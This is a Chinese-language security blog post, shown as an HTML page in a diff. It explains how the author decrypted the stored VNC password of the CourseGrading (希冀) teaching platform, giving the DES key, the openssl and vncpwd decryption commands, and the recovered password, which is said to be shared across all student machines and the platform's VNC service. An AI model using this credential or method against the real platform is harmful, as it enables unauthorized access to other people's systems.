@@ -1,0 +1,344 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>CourseGrading 希冀平台VNC密码 | flyD</title>
+
+<link rel="shortcut icon" href="https://flyd.uk/favicon.ico?v=1699457449077">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://flyd.uk/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dart.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/go.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/python.min.js"></script>
+
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            flyD
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699457449077"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CourseGrading 希冀平台VNC密码
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-03-14 ·
+                    </time>
+                    
+                        <a href="https://flyd.uk/AqsJrGnnM/" class="post-tags">
+                            # 记录
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <p>希冀是开放、可扩展的信息类专业教学、实验与科研一体化平台。该平台会在32770端口开VNC服务，32771端口为noVNC服务。本文记录一下破解该VNC密码的过程。</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://flyd.uk/post-images/1678754240985.png" alt="" loading="lazy"></figure>
+<p>通过查看进程，可以得知学生实验机都开了VNC。<img src="https://flyd.uk/post-images/1678754358391.png" alt="" loading="lazy"><br>
+搜索该脚本所在位置</p>
+<pre><code>root@cg:~/Desktop# find / -name &quot;vnc_startup.sh&quot;
+/dockerstartup/vnc_startup.sh
+</code></pre>
+<p>进一步查看脚本内容</p>
+<pre><code>root@cg:~/Desktop# cat /dockerstartup/vnc_startup.sh
+#!/bin/bash
+### every exit != 0 fails the script
+set -e
+
+## print out help
+help (){
+echo &quot;
+USAGE:
+docker run -it -p 6901:6901 -p 5901:5901 consol/&lt;image&gt;:&lt;tag&gt; &lt;option&gt;
+
+IMAGES:
+consol/ubuntu-xfce-vnc
+consol/centos-xfce-vnc
+consol/ubuntu-icewm-vnc
+consol/centos-icewm-vnc
+
+TAGS:
+latest  stable version of branch 'master'
+dev     current development version of branch 'dev'
+
+OPTIONS:
+-w, --wait      (default) keeps the UI and the vncserver up until SIGINT or SIGTERM will received
+-s, --skip      skip the vnc startup and just execute the assigned command.
+                example: docker run consol/centos-xfce-vnc --skip bash
+-d, --debug     enables more detailed startup output
+                e.g. 'docker run consol/centos-xfce-vnc --debug bash'
+-h, --help      print out this help
+
+Fore more information see: https://github.com/ConSol/docker-headless-vnc-container
+&quot;
+}
+if [[ $1 =~ -h|--help ]]; then
+    help
+    exit 0
+fi
+
+# should also source $STARTUPDIR/generate_container_user
+source $HOME/.bashrc
+
+# add `--skip` to startup args, to skip the VNC startup procedure
+if [[ $1 =~ -s|--skip ]]; then
+    echo -e &quot;\n\n------------------ SKIP VNC STARTUP -----------------&quot;
+    echo -e &quot;\n\n------------------ EXECUTE COMMAND ------------------&quot;
+    echo &quot;Executing command: '${@:2}'&quot;
+    exec &quot;${@:2}&quot;
+fi
+if [[ $1 =~ -d|--debug ]]; then
+    echo -e &quot;\n\n------------------ DEBUG VNC STARTUP -----------------&quot;
+    export DEBUG=true
+fi
+
+## correct forwarding of shutdown signal
+cleanup () {
+    kill -s SIGTERM $!
+    exit 0
+}
+trap cleanup SIGINT SIGTERM
+
+## write correct window size to chrome properties
+$STARTUPDIR/chrome-init.sh
+
+## resolve_vnc_connection
+VNC_IP=$(hostname -i)
+
+## change vnc password
+echo -e &quot;\n------------------ change VNC password  ------------------&quot;
+# first entry is control, second is view (if only one is valid for both)
+mkdir -p &quot;$HOME/.vnc&quot;
+PASSWD_PATH=&quot;$HOME/.vnc/passwd&quot;
+
+if [[ -f $PASSWD_PATH ]]; then
+    echo -e &quot;\n---------  purging existing VNC password settings  ---------&quot;
+    rm -f $PASSWD_PATH
+fi
+
+if [[ $VNC_VIEW_ONLY == &quot;true&quot; ]]; then
+    echo &quot;start VNC server in VIEW ONLY mode!&quot;
+    #create random pw to prevent access
+    echo $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20) | vncpasswd -f &gt; $PASSWD_PATH
+fi
+echo &quot;$VNC_PW&quot; | vncpasswd -f &gt;&gt; $PASSWD_PATH
+chmod 600 $PASSWD_PATH
+
+
+## start vncserver and noVNC webclient
+echo -e &quot;\n------------------ start noVNC  ----------------------------&quot;
+if [[ $DEBUG == true ]]; then echo &quot;$NO_VNC_HOME/utils/launch.sh --vnc localhost:$VNC_PORT --listen $NO_VNC_PORT&quot;; fi
+$NO_VNC_HOME/utils/launch.sh --vnc localhost:$VNC_PORT --listen $NO_VNC_PORT &amp;&gt; $STARTUPDIR/no_vnc_startup.log &amp;
+PID_SUB=$!
+
+echo -e &quot;\n------------------ start VNC server ------------------------&quot;
+echo &quot;remove old vnc locks to be a reattachable container&quot;
+vncserver -kill $DISPLAY &amp;&gt; $STARTUPDIR/vnc_startup.log \
+    || rm -rfv /tmp/.X*-lock /tmp/.X11-unix &amp;&gt; $STARTUPDIR/vnc_startup.log \
+    || echo &quot;no locks present&quot;
+
+echo -e &quot;start vncserver with param: VNC_COL_DEPTH=$VNC_COL_DEPTH, VNC_RESOLUTION=$VNC_RESOLUTION\n...&quot;
+if [[ $DEBUG == true ]]; then echo &quot;vncserver $DISPLAY -depth $VNC_COL_DEPTH -geometry $VNC_RESOLUTION&quot;; fi
+vncserver $DISPLAY -depth $VNC_COL_DEPTH -geometry $VNC_RESOLUTION &amp;&gt; $STARTUPDIR/no_vnc_startup.log
+echo -e &quot;start window manager\n...&quot;
+$HOME/wm_startup.sh &amp;&gt; $STARTUPDIR/wm_startup.log
+
+## log connect options
+echo -e &quot;\n\n------------------ VNC environment started ------------------&quot;
+echo -e &quot;\nVNCSERVER started on DISPLAY= $DISPLAY \n\t=&gt; connect via VNC viewer with $VNC_IP:$VNC_PORT&quot;
+echo -e &quot;\nnoVNC HTML client started:\n\t=&gt; connect via http://$VNC_IP:$NO_VNC_PORT/?password=...\n&quot;
+
+
+if [[ $DEBUG == true ]] || [[ $1 =~ -t|--tail-log ]]; then
+    echo -e &quot;\n------------------ $HOME/.vnc/*$DISPLAY.log ------------------&quot;
+    # if option `-t` or `--tail-log` block the execution and tail the VNC log
+    tail -f $STARTUPDIR/*.log $HOME/.vnc/*$DISPLAY.log
+fi
+
+if [ -z &quot;$1&quot; ] || [[ $1 =~ -w|--wait ]]; then
+    wait $PID_SUB
+else
+    # unknown option ==&gt; call command
+    echo -e &quot;\n\n------------------ EXECUTE COMMAND ------------------&quot;
+    echo &quot;Executing command: '$@'&quot;
+    exec &quot;$@&quot;
+fi
+</code></pre>
+<p>很乱，但是可以看到里面有/.vnc/passwd字段，推测就是密码存放位置。<br>
+最终在/headless/.vnc/passwd目录下找到了密码文件，密码是通过DES-CBC-NoPadding加密后的<br>
+Key为<code>e84ad660c4721ae0</code>，IV为<code>0000000000000000</code>。</p>
+<figure data-type="image" tabindex="2"><img src="https://flyd.uk/post-images/1678755768816.png" alt="" loading="lazy"></figure>
+<hr>
+<p>可以去开一台makefile的学生机进行编译，免去了环境配置时间。<br>
+<a href="https://github.com/jeroennijhof/vncpwd">https://github.com/jeroennijhof/vncpwd</a></p>
+<pre><code>root@cg:~/Desktop# make &amp;&amp; chmod +x ./vncpwd &amp;&amp; ./vncpwd /headless/.vnc/passwd
+Password: vncpassw
+</code></pre>
+<hr>
+<p><a href="https://github.com/billchaison/VNCDecrypt">https://github.com/billchaison/VNCDecrypt</a></p>
+<pre><code>root@cg:~/Desktop# echo -n 40CCA9718FFB8E91 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+
+00000000  76 6e 63 70 61 73 73 77                           |vncpassw|
+00000008
+</code></pre>
+<hr>
+<p>得到密码: <code>vncpassw</code>，该密码为所有学生机VNC密码，也为平台在32770的VNC服务的密码。</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://flyd.uk/post/cve-2023-24249/" class="post-title gt-a-link">
+                    CVE-2023-24249
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/xiaoWangSec" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    
+    <div class="slogan gt-c-content-color-first"><script type='text/javascript'>
+$.get("https://v1.hitokoto.cn/",function(data,status){
+  if (status == 'success'){
+    $('.slogan.gt-c-content-color-first').text(data.hitokoto);
+  }else{
+    $('.hitokoto').text('奈何明月照沟渠');
+  }
+});
+</script></div>
+
+    <!-- <div class="footer-info">
+        
+    </div> -->
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://flyd.uk/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
